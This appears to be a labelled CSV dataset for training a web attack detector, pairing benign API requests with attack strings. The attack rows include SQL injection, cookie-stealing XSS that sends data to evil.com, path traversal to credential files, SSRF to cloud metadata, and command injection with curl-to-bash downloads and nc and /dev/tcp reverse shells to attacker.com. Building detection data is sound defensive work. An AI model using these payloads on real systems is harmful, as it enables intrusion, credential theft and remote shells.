"text","label"
"username=' OR 'x'='x","1"
"GET /api/login/4135","0"
"<img src='x' onerror='alert(1)'>","1"
"id=1 OR 1=1","1"
"user_id=979&action=view","0"
"admin'#","1"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"user_id=969&action=view","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"POST /api/users body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"file=..%2F..%2F..%2Fetc%2Fpasswd","1"
"GET /health HTTP/1.1","0"
"password spray attack detected multiple users","1"
"../../../etc/shadow","1"
"GET /api/data?status=pending&priority=high","0"
"description=<div onmouseover=alert(1)>hover</div>","1"
"GET /health HTTP/1.1","0"
"name=%3Cscript%3Ealert(1)%3C/script%3E","1"
"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"POST /api/data User-Agent: python-requests/2.31.0","0"
"login attempt failed username admin invalid credentials","1"
"date=2024-01-15&type=order","0"
"GET /api/files?name=..%2F..%2F..%2Fetc%2Fpasswd","1"
"path=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"$(curl -s http://attacker.com/shell.sh)","1"
"login attempt failed username admin invalid credentials","1"
"GET /backup.sql HTTP/1.1","1"
"GET /backup.sql HTTP/1.1","1"
"login attempt failed username admin invalid credentials","1"
"user_id=852&action=view","0"
"cmd=; cat /etc/shadow","1"
"name=Sara email=304@mail.com","0"
"ping=| cat /etc/passwd","1"
"| cat /etc/passwd","1"
"include=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"GET /robots.txt scan probe reconnaissance","1"
"username=user&password=admin","1"
"include=....//....//etc/passwd","1"
"url=dict://127.0.0.1:11211/","1"
"GET /api/orders/5802","0"
"search=laptop","0"
"GET /health HTTP/1.1","0"
"POST /api/login username=' OR 1=1 INTO OUTFILE '/tmp/x'-- password=test","1"
"GET /api/products/9277","0"
"admin'#","1"
"username=root&password=password","1"
"POST /api/search User-Agent: axios/1.6.0","0"
"username=user&password=1234567890","1"
"url=http://metadata.google.internal","1"
"url=http://10.0.0.1","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/users/3002","0"
"GET /api/files?name=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"category=electronics&page=1","0"
"login attempt failed username admin invalid credentials","1"
"username=' OR 1=1 LIMIT 1--","1"
"category=tablets page=4","0"
"' UNION SELECT 1,table_name FROM information_schema.tables--","1"
"title=<a href='javascript:alert(1)'>click</a>","1"
"url=dict://127.0.0.1:11211/","1"
"order_id=ORD-1268 status=confirmed","0"
"exec=| wget http://attacker.com/shell.sh","1"
"order_id=1 AND SLEEP(5)--","1"
"url=file:///etc/passwd","1"
"POST /api/data User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"Authorization: Bearer validtoken246","0"
"<script>fetch('https://evil.com?c='+document.cookie)</script>","1"
"name=javascript:alert(document.cookie)","1"
"id=' UNION SELECT username,password FROM users--","1"
"DELETE /api/search User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"category=phones page=3","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"name=javascript:alert(document.cookie)","1"
"GET /health HTTP/1.1","0"
"User-Agent: Nmap Scripting Engine","1"
"GET /api/orders User-Agent: axios/1.6.0","0"
"url=http://192.168.1.1","1"
"POST /api/products?limit=20&offset=0","0"
"path=../../../../proc/self/environ","1"
"POST /api/search?limit=20&offset=0","0"
"user=1 OR 1=1","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"PUT /api/users?q=smartphone&brand=samsung","0"
"GET /web.config HTTP/1.1","1"
"brute force attempt on login endpoint from single ip","1"
"brute force attempt on login endpoint from single ip","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"cmd=`curl -s http://attacker.com/shell.sh | bash`","1"
"User-Agent: masscan/1.3","1"
"search=' UNION SELECT username,password FROM users--","1"
"url=http://metadata.google.internal","1"
"order_id=ORD-9645 status=confirmed","0"
"user_id=800&action=view","0"
"GET /api/search?q=<scr ipt>alert(1)</scr ipt>","1"
"../../../var/www/html/config.php","1"
"GET /web.config HTTP/1.1","1"
"filename=| wget http://attacker.com/shell.sh","1"
"GET /robots.txt scan probe reconnaissance","1"
"name=Ahmed email=184@mail.com","0"
"POST /profile body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"category=tablets page=9","0"
"GET /health HTTP/1.1","0"
"multiple failed login attempts detected for admin","1"
"path=../../../../var/log/apache2/access.log","1"
"name=Sara email=414@mail.com","0"
"order_id=ORD-2512 status=confirmed","0"
"url=http://10.0.0.1","1"
"category=tablets page=9","0"
"GET /health HTTP/1.1","0"
"comment=<svg onload=alert(1)>","1"
"username=administrator&password=letmein","1"
"user_id=154&action=view","0"
"GET ../../../.env","1"
"DELETE /settings?search=laptop&sort=price","0"
"GET /profile/3831","0"
"repeated authentication failure admin account locked","1"
"order_id=ORD-4736 status=confirmed","0"
"fetch=http://internal-service:8080/secret","1"
"POST /api/orders body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"user_id=486&action=view","0"
"GET /api/login/7076","0"
"include=../../../.env","1"
"url=http://metadata.google.internal","1"
"user_id=341&action=view","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"exec=& ipconfig","1"
"login attempt failed username admin invalid credentials","1"
"POST /api/login username=1 AND SLEEP(5)-- password=test","1"
"exec=$(whoami)","1"
"GET /health HTTP/1.1","0"
"username=user&password=password123","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"title=<audio src=1 onerror=alert(1)>","1"
"GET /.git/config HTTP/1.1","1"
"GET /robots.txt scan probe reconnaissance","1"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"message=';alert(String.fromCharCode(88,83,83))//","1"
"filename=| uname -a","1"
"../../../../etc/shadow","1"
"Authorization: Bearer validtoken760","0"
"POST /api/login username=1' /*!OR*/ 1=1-- password=test","1"
"User-Agent: Nmap Scripting Engine","1"
"search=' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--","1"
"DELETE /profile User-Agent: axios/1.6.0","0"
"file=/etc/passwd%00","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"title=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"DELETE /api/login User-Agent: PostmanRuntime/7.36.0","0"
"url=http://metadata.google.internal","1"
"id=admin'--","1"
"path=file:///etc/passwd","1"
"user=' UNION SELECT username,password FROM users--","1"
"username=admin&password=abc123","1"
"filename=| uname -a","1"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"GET /web.config HTTP/1.1","1"
"url=http://169.254.169.254/latest/meta-data/","1"
"GET /health HTTP/1.1","0"
"user_id=231&action=view","0"
"host=| wget http://attacker.com/shell.sh","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /wp-admin HTTP/1.1","1"
"id=' OR 1=1#","1"
"file=/etc/passwd%00","1"
"filename=; ping -c 4 attacker.com","1"
"search=phone","0"
"username=admin&password=monkey","1"
"<ScRiPt>alert(1)</ScRiPt>","1"
"multiple failed login attempts detected for admin","1"
"POST /api/orders body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"date=2024-01-15&type=order","0"
"brute force attempt on login endpoint from single ip","1"
"fetch=http://internal-service:8080/secret","1"
"username=admin&password=password123","1"
"Authorization: Bearer validtoken723","0"
"DELETE /api/orders?status=pending&priority=high","0"
"message=<input onfocus=alert(1) autofocus>","1"
"Authorization: Bearer validtoken570","0"
"GET file:///etc/passwd","1"
"POST /settings body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"multiple failed login attempts detected for admin","1"
"' OR '1'='1","1"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"order_id=admin'--","1"
"POST /api/search body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"order_id=ORD-8165 status=confirmed","0"
"GET /settings/6374","0"
"name=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"search=<body onload=alert(1)>","1"
"order_id=id=1&id=2 UNION SELECT 1,2--","1"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"comment=<img src=`javascript:alert(1)`>","1"
"username=admin&password=monkey","1"
"POST /api/data User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"category=electronics&page=1","0"
"POST /api/data body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"category=laptops page=2","0"
"fetch=http://internal-service:8080/secret","1"
"POST /api/data body=command; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"GET /api/search?q=<script>alert(1)</script>","1"
"DELETE /api/login?status=pending&priority=high","0"
"User-Agent: Nikto/2.5.0","1"
"user_id=150&action=view","0"
"url=http://127.0.0.1/admin","1"
"POST /api/data body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"GET /api/orders User-Agent: axios/1.6.0","0"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"user_id=459&action=view","0"
"POST /api/data body=command`curl -s http://attacker.com/shell.sh | bash`","1"
"url=http://169.254.169.254/latest/meta-data/","1"
"url=http://192.168.1.1","1"
"filename=; ping -c 4 attacker.com","1"
"order_id=ORD-9817 status=confirmed","0"
"cmd=& ipconfig","1"
"date=2024-01-15&type=order","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"order_id=1' AND SLEEP(5)--","1"
"exec=& ipconfig","1"
"GET /api/search?q=<img src=x onerror=alert(1)>","1"
"user=1' OR '1'='1' /*","1"
"POST /dashboard body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"ping=|| nc -e /bin/sh attacker.com 4444","1"
"GET /api/login/2850","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"message=<div onmouseover=alert(1)>hover</div>","1"
"file=..%2F..%2F..%2Fetc%2Fpasswd","1"
"category=phones page=8","0"
"GET ../../.git/config","1"
"status=pending&priority=high","0"
"order_id=1' /*!OR*/ 1=1--","1"
"url=http://192.168.1.1","1"
"url=http://192.168.1.1","1"
"<script >alert(1)</script >","1"
"GET /api/users/7411","0"
"../../../../proc/self/environ","1"
"date=2024-01-15&type=order","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"page=6&limit=50","0"
"search=&#60;script&#62;alert(1)&#60;/script&#62;","1"
"POST /api/orders body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"username=user&password=batman","1"
"date=2024-01-15&type=order","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"username=root&password=batman","1"
"filename=`id`","1"
"POST /api/data body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"cmd=& ipconfig","1"
"order_id=ORD-7566 status=confirmed","0"
"order_id=ORD-2347 status=confirmed","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /api/feedback body=""><script>alert(1)</script>","1"
"search=tablet","0"
"POST /api/login username=admin'-- password=test","1"
"message=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"cmd=$(whoami)","1"
"username=' OR 1=1 LIMIT 1--","1"
"order_id=ORD-1367 status=confirmed","0"
"GET /health HTTP/1.1","0"
"PUT /dashboard?user=ahmed&filter=active","0"
"POST /api/orders User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"exec=|| nc -e /bin/sh attacker.com 4444","1"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /server-status HTTP/1.1","1"
"DELETE /api/products?date=2024-01-15&type=order","0"
"page=48&limit=50","0"
"order_id=ORD-2933 status=confirmed","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /settings/563","0"
"user_id=690&action=view","0"
"POST /api/login username=' UNION SELECT NULL-- password=test","1"
"GET /api/search?id=123&format=json","0"
"name=Omar email=478@mail.com","0"
"GET /profile User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"name=Nour email=754@mail.com","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"GET /wp-admin HTTP/1.1","1"
"title=<body onload=alert(1)>","1"
"GET /server-status HTTP/1.1","1"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"path=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"| cat /etc/passwd","1"
"GET /api/products?search=laptop&sort=price","0"
"message=<textarea onfocus=alert(1) autofocus>","1"
"username=admin&password=admin","1"
"POST /api/data body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"PUT /settings?search=laptop&sort=price","0"
"id=admin'#","1"
"POST /api/orders body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"name=Ahmed email=818@mail.com","0"
"repeated authentication failure admin account locked","1"
"url=http://192.168.1.1","1"
"file=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"DELETE /profile User-Agent: axios/1.6.0","0"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"order_id=ORD-9533 status=confirmed","0"
"GET /etc/passwd%00","1"
"path=file:///etc/passwd","1"
"GET /backup.sql HTTP/1.1","1"
"GET /wp-admin HTTP/1.1","1"
"PUT /settings?limit=20&offset=0","0"
"GET /api/login/9650","0"
"username=root&password=monkey","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"page=33&limit=20","0"
"GET ../../../../var/log/apache2/access.log","1"
"search=tablet","0"
"Authorization: Bearer validtoken126","0"
"GET /api/orders/3180","0"
"GET /api/swagger.json HTTP/1.1","1"
"POST /profile body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"GET /health HTTP/1.1","0"
"name=Omar email=385@mail.com","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"page=30&limit=10","0"
"GET /.env HTTP/1.1","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"GET /health HTTP/1.1","0"
"id='; UPDATE users SET password='hacked' WHERE 1=1--","1"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"username=admin&password=qwerty","1"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /backup.sql HTTP/1.1","1"
"1' OR 0x31=0x31--","1"
"name=Omar email=609@mail.com","0"
"url=file:///etc/passwd","1"
"POST /api/users?limit=20&offset=0","0"
"username=administrator&password=batman","1"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"search=laptop","0"
"Authorization: Bearer validtoken101","0"
"GET /console HTTP/1.1","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"order_id=ORD-8762 status=confirmed","0"
"POST /api/users body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"name=Omar email=735@mail.com","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/users?id=1 UNION SELECT @@version,NULL--","1"
"multiple failed login attempts detected for admin","1"
"GET /api/orders?limit=20&offset=0","0"
"user_id=199&action=view","0"
"POST /api/login username=1'||'1'='1 password=test","1"
"PUT /api/users User-Agent: axios/1.6.0","0"
"url=dict://127.0.0.1:11211/","1"
"POST /profile User-Agent: PostmanRuntime/7.36.0","0"
"filename=`id`","1"
"POST /api/search User-Agent: python-requests/2.31.0","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /health HTTP/1.1","0"
"url=file:///etc/passwd","1"
"include=..%2F..%2F..%2Fetc%2Fpasswd","1"
"GET /.git/config HTTP/1.1","1"
"GET /api/users/903","0"
"page=36&limit=50","0"
"id=123&format=json","0"
"include=../../../etc/shadow","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"date=2024-01-15&type=order","0"
"limit=20&offset=0","0"
"search=headphones","0"
"username=administrator&password=monkey","1"
"PUT /dashboard?category=electronics&page=1","0"
"page=42&limit=10","0"
"POST /dashboard body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"user=' UNION SELECT username,password FROM users--","1"
